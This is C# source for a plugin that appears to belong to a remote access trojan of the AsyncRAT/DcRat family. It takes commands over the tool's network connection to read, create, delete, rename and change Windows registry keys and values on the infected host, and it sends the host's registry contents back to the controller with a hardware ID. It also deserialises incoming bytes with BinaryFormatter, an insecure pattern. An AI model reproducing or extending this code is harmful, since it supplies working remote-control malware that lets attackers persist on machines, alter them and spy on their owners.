﻿using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading;
using MessagePackLib.MessagePack;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using System.Runtime.Serialization.Formatters.Binary;
using static Plugin.Handler.RegistrySeeker;
using ProtoBuf;

namespace Plugin.Handler
{
    public class RegManager
    {
        public RegManager(MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "LoadRegistryKey":
                        {
                            string RootKeyName = unpack_msgpack.ForcePathObject("RootKeyName").AsString;
                            LoadKey(RootKeyName);
                            break;
                        }
                    case "CreateRegistryKey":
                        {
                            string ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                            CreateKey(ParentPath);
                            break;
                        }
                    case "DeleteRegistryKey":
                        {
                            string KeyName = unpack_msgpack.ForcePathObject("KeyName").AsString;
                            string ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                            DeleteKey(KeyName, ParentPath);
                            break;
                        }
                    case "RenameRegistryKey":
                        {
                            string OldKeyName = unpack_msgpack.ForcePathObject("OldKeyName").AsString;
                            string NewKeyName = unpack_msgpack.ForcePathObject("NewKeyName").AsString;
                            string ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                            RenameKey(OldKeyName, NewKeyName, ParentPath);
                            break;
                        }
                    case "CreateRegistryValue":
                        {
                            string KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                            string Kindstring = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                            CreateValue(KeyPath, Kindstring);
                            break;
                        }
                    case "DeleteRegistryValue":
                        {
                            string KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                            string ValueName = unpack_msgpack.ForcePathObject("ValueName").AsString;
                            DeleteValue(KeyPath, ValueName);
                            break;
                        }
                    case "RenameRegistryValue":
                        {
                            string OldValueName = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                            string NewValueName = unpack_msgpack.ForcePathObject("NewValueName").AsString;
                            string KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                            RenameValue(OldValueName, NewValueName, KeyPath);
                            break;
                        }
                    case "ChangeRegistryValue":
                        {
                            byte[] Valuebyte = unpack_msgpack.ForcePathObject("Value").GetAsBytes();
                            BinaryFormatter formatter = new BinaryFormatter();
                            MemoryStream mStream = new MemoryStream();
                            mStream.Write(Valuebyte, 0, Valuebyte.Length);
                            mStream.Flush();
                            mStream.Seek(0, SeekOrigin.Begin);
                            RegValueData Value = (RegValueData)formatter.Deserialize(mStream);
                            ChangeValue(Value, unpack_msgpack.ForcePathObject("KeyPath").AsString);
                            break;
                        }
                }

            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Packet.Error(ex.Message);
            }
        }


        public static byte[] Serialize(RegSeekerMatch[] Matches)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                Serializer.Serialize(ms, Matches);
                return ms.ToArray();
            }
        }        


        public void LoadKey(string RootKeyName)
        {
            try
            {
                RegistrySeeker seeker = new RegistrySeeker();
                seeker.BeginSeeking(RootKeyName);


                //BinaryFormatter formatter = new BinaryFormatter();
                //MemoryStream mStream = new MemoryStream();
                //formatter.Serialize(mStream, seeker.Matches);
                //mStream.Flush();

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "LoadKey";
                msgpack.ForcePathObject("RootKey").AsString = RootKeyName;
                msgpack.ForcePathObject("Matches").SetAsBytes(Serialize(seeker.Matches));
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        [ProtoContract]
        public class GetRegistryKeysResponse
        {
            [ProtoMember(1)]
            public RegSeekerMatch[] Matches { get; set; }

            [ProtoMember(2)]
            public string RootKey { get; set; }

            [ProtoMember(3)]
            public bool IsError { get; set; }

            [ProtoMember(4)]
            public string ErrorMsg { get; set; }
        }


        public void CreateKey(string ParentPath)
        {
            string errorMsg;
            string newKeyName = "";

            try
            {
                RegistryEditor.CreateRegistryKey(ParentPath, out newKeyName, out errorMsg);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
        public void DeleteKey(string KeyName, string ParentPath)
        {
            string errorMsg;
            try
            {
                RegistryEditor.DeleteRegistryKey(KeyName, ParentPath, out errorMsg);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
        public void RenameKey(string OldKeyName, string NewKeyName, string ParentPath)
        {
            string errorMsg;
            try
            {
                RegistryEditor.RenameRegistryKey(OldKeyName, NewKeyName, ParentPath, out errorMsg);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
        public void CreateValue(string KeyPath, string Kindstring)
        {
            string errorMsg;
            string newKeyName = "";
            RegistryValueKind Kind = RegistryValueKind.None;
            switch (Kindstring) 
            {
                case "-1":
                    {
                        Kind = RegistryValueKind.None;
                        break;
                    }
                case "0":
                    {
                        Kind = RegistryValueKind.Unknown;
                        break;
                    }
                case "1":
                    {
                        Kind = RegistryValueKind.String;
                        break;
                    }
                case "2":
                    {
                        Kind = RegistryValueKind.ExpandString;
                        break;
                    }
                case "3":
                    {
                        Kind = RegistryValueKind.Binary;
                        break;
                    }
                case "4":
                    {
                        Kind = RegistryValueKind.DWord;
                        break;
                    }
                case "7":
                    {
                        Kind = RegistryValueKind.MultiString;
                        break;
                    }
                case "11":
                    {
                        Kind = RegistryValueKind.QWord;
                        break;
                    }
            }
            try
            {
                RegistryEditor.CreateRegistryValue(KeyPath, Kind, out newKeyName, out errorMsg);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
        public void DeleteValue(string KeyPath,string ValueName)
        {
            string errorMsg;
            try
            {
                RegistryEditor.DeleteRegistryValue(KeyPath, ValueName, out errorMsg);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
        public void RenameValue(string OldValueName, string NewValueName, string KeyPath)
        {
            string errorMsg;
            try
            {
                RegistryEditor.RenameRegistryValue(OldValueName, NewValueName, KeyPath, out errorMsg);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
        public void ChangeValue(RegValueData Value, string KeyPath)
        {
            string errorMsg;
            try
            {
                RegistryEditor.ChangeRegistryValue(Value, KeyPath, out errorMsg);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
    }
}

